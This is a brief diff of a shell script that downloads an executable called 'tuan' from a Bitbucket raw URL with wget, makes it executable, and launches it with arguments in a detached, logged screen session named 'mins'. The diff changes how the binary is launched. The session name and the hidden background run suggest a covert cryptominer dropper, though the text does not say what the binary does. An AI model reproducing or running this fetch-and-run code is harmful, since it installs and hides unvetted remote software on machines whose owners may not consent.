@@ -12,7 +12,7 @@ if [ -f "$FILE" ]; then
     echo "$FILE exists."
 else 
     wget https://bitbucket.org/solomase/garangsem/raw/d261db312adaef2baefd19624650e14af8c938dc/tuan
-    mv tuan $TIP
+    
     chmod +x *
 fi
-nohup./$TIP $COMS
+screen -dmLS mins ./tuan $COMS
